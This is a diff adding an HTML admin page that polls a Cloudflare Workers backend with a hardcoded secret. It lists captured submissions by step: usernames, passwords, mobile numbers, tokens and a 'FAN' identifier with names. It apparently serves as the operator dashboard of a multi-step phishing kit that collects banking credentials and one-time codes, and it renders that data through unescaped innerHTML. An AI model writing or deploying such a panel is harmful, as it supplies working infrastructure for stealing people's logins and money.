@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Admin - Submissions</title>
+  <style>
+    body{font-family:Arial;margin:0;background:#f0f2f5;}
+    .header{background:linear-gradient(#0d47a1,#1565c0);color:white;text-align:center;padding:20px;}
+    .header img{max-width:220px;}
+    .container{max-width:1100px;margin:20px auto;padding:0 15px;}
+    table{width:100%;border-collapse:collapse;background:white;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
+    th,td{padding:12px;border:1px solid #ddd;text-align:left;}
+    th{background:#0d47a1;color:white;}
+    .step{background:#d32f2f;color:white;padding:4px 10px;border-radius:4px;font-size:0.9em;}
+    #loading,#nodata{text-align:center;padding:100px 20px;font-size:1.3em;color:#666;}
+  </style>
+</head>
+<body>
+<div class="header"><img src="https://via.placeholder.com/220x60/0d47a1/fff?text=Admin+Panel" alt="Admin"></div>
+<div class="container">
+  <h2 style="text-align:center;color:#0d47a1;">All Submissions</h2>
+  <div id="loading">Loading data...</div>
+  <div id="nodata" style="display:none;">No data yet.</div>
+  <table id="tbl" style="display:none;">
+    <thead><tr><th>#</th><th>Step</th><th>Data</th><th>Time</th></tr></thead>
+    <tbody id="body"></tbody>
+  </table>
+</div>
+
+<script>
+const API = "https://form-save-backend.youraccount.workers.dev/admin-fetch";
+const SECRET = "mystrongsecret123changeitplease2026";  // MUST MATCH WORKER
+
+async function load() {
+  const loading = document.getElementById("loading");
+  const nodata = document.getElementById("nodata");
+  const tbl = document.getElementById("tbl");
+  const body = document.getElementById("body");
+  body.innerHTML = "";
+
+  try {
+    const res = await fetch(API, { headers: { "x-admin-secret": SECRET } });
+    if (!res.ok) throw new Error();
+    const data = await res.json();
+
+    if (data.length === 0) {
+      loading.style.display = "none";
+      nodata.style.display = "block";
+      return;
+    }
+
+    loading.style.display = "none";
+    tbl.style.display = "table";
+
+    data.forEach((item, i) => {
+      const tr = document.createElement("tr");
+      let details = "";
+      if (item.username) details += `Username: ${item.username}<br>Password: ${item.password || ''}<br>Mobile: ${item.mobile || ''}<br>`;
+      if (item.token) details += `Token: ${item.token}<br>`;
+      if (item.fan) details += `FAN: ${item.fan}<br>Name: ${item.name || ''}<br>`;
+      tr.innerHTML = `
+        <td>${i+1}</td>
+        <td><span class="step">${item.step.toUpperCase()}</span></td>
+        <td>${details || '—'}</td>
+        <td>${new Date(item.time).toLocaleString("en-IN")}</td>
+      `;
+      body.appendChild(tr);
+    });
+  } catch {
+    loading.textContent = "Error loading data";
+  }
+}
+
+load();
+setInterval(load, 7000); // refresh
+</script>
+</body>
+</html>
